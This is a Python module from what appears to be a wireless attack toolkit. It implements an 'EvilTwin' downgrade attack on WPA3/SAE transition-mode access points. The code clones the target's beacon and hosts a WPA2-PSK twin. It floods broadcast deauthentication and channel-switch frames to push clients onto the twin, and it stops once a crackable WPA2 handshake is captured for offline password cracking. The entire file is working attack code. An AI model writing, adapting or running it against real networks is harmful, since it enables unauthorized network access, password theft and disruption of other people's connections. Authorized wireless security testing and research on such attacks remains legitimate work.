"""EvilTwin: downgrade attack against WPA3/SAE transition-mode APs. Punt the client onto a WPA2-PSK
twin so it re-associates with PSK (a crackable M2) instead of SAE.
"""
from __future__ import annotations

import asyncio
import enum
import logging
from dataclasses import dataclass
from typing import Optional

from wifit3.dot11 import build_deauth, str_to_mac
from wifit3.dot11.ap import beacon_clone
from wifit3.dot11.csa import build_csa_beacon
from wifit3.crack.handshake import crackable_pairs
from wifit3.campaigns.campaign import Campaign
from wifit3.campaigns.eviltwin.fake_ap import FakeAP

logger = logging.getLogger(__name__)

_BROADCAST = b"\xff\xff\xff\xff\xff\xff"
_BURST_SIZE = 64
_FRAME_GAP_SEC = 0.002
_POLL_SEC = 0.25
_CSA_RETURN_SEC = 2.0
_DEAUTH_REASON = 7                               # class-3 frame from a nonassociated STA


class PuntMode(enum.Enum):
    CSA = "csa"
    DEAUTH = "deauth"
    BOTH = "both"
    NONE = "none"


@dataclass(frozen=True)
class EvilTwinInput:
    """Immutable config the modal builds for the campaign."""
    twin_iface: object            # SPOOFABLE interface hosting the WPA2 twin
    punt_iface: object            # interface on the target's channel
    twin_channel: int
    punt_mode: PuntMode = PuntMode.BOTH
    punt_period_sec: float = 30.0


class EvilTwinCampaign(Campaign):
    button_id = "btn-eviltwin"
    key = "eviltwin"
    idle_label = "EvilTwin"
    run_label = "Stop EvilTwin"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap) -> bool:
        return bool(ap.ssid) and bool(ap.akm_suites)

    @classmethod
    def ineligible_reason(cls, ap) -> Optional[str]:
        if not ap.last_beacon_frame:
            return "no beacon captured yet"
        return None

    def __init__(self, array, target, evil_input: EvilTwinInput, log=None):
        if not target.last_beacon_frame:
            raise ValueError("EvilTwin needs a captured beacon to clone; none seen yet.")
        if not target.ssid:
            raise ValueError("EvilTwin needs a known SSID: target is hidden.")
        super().__init__(ap=target, array=array)
        self.log = log or (lambda _m: None)
        self.ssid = target.ssid
        self.bssid = target.bssid
        self.bssid_bytes = str_to_mac(target.bssid)
        self.target_channel = target.channel
        self.twin_iface = evil_input.twin_iface
        self.punt_iface = evil_input.punt_iface
        self.twin_channel = evil_input.twin_channel
        self.punt_mode = evil_input.punt_mode
        self.punt_period_sec = evil_input.punt_period_sec
        self.real_beacon = target.last_beacon_frame
        self.twin_beacon = beacon_clone(target.last_beacon_frame, evil_input.twin_channel)
        self.fakeap: Optional[FakeAP] = None
        self.captured = False

    async def _loop(self) -> None:
        self.fakeap = FakeAP(self.twin_iface, self.bssid_bytes, self.ssid, self.twin_channel,
                             self.twin_beacon, rx_source=self.twin_iface,
                             record_m1=self.array.record_injected_eapol)
        await self.fakeap.start()
        self.log(f"EvilTwin up on CH {self.twin_channel} (target CH {self.target_channel})")

        frames = self._punt_frames()
        if frames and self.punt_iface.current_channel != self.target_channel:
            await self.punt_iface.set_channel(self.target_channel)

        while not self.stopped and not self._is_captured():
            await self._punt_burst(frames)
            await self._sleep_between_bursts(self.punt_period_sec)
        if self._is_captured():
            self.log("crackable handshake captured; stopping")

    def _punt_frames(self) -> list[bytes]:
        """The CSA and/or deauth frames to spray each burst, per punt_mode."""
        frames = []
        if self.punt_mode in (PuntMode.CSA, PuntMode.BOTH):
            frames.append(build_csa_beacon(self.real_beacon, self.twin_channel))
        if self.punt_mode in (PuntMode.DEAUTH, PuntMode.BOTH):
            frames.append(build_deauth(_BROADCAST, self.bssid_bytes, self.bssid_bytes, _DEAUTH_REASON))
        return frames

    async def _punt_burst(self, frames: list[bytes]) -> None:
        for frame in frames:
            for _ in range(_BURST_SIZE):
                await self.punt_iface.send_no_wait(frame)
                await asyncio.sleep(_FRAME_GAP_SEC)

    async def _sleep_between_bursts(self, seconds: float) -> None:
        """Sleep up to `seconds`, waking early on stop or a capture."""
        elapsed = 0.0
        while elapsed < seconds and not self.stopped and not self._is_captured():
            await asyncio.sleep(_POLL_SEC)
            elapsed += _POLL_SEC

    def _is_captured(self) -> bool:
        ap = self.array.access_points.get(self.bssid)
        if ap is not None and any(crackable_pairs(hs) for hs in ap.handshakes.values()):
            self.captured = True
        return self.captured

    async def teardown(self) -> None:
        if self.fakeap is None:
            return
        try:
            await self._csa_return()
        finally:
            await self.fakeap.stop()
        self.log("EvilTwin stopped")

    async def _csa_return(self) -> None:
        """CSA the twin-channel clients back to the target's channel."""
        frame = build_csa_beacon(self.twin_beacon, self.target_channel)
        elapsed = 0.0
        while elapsed < _CSA_RETURN_SEC:
            for _ in range(_BURST_SIZE):
                await self.twin_iface.send_no_wait(frame)
                await asyncio.sleep(_FRAME_GAP_SEC)
            elapsed += _BURST_SIZE * _FRAME_GAP_SEC
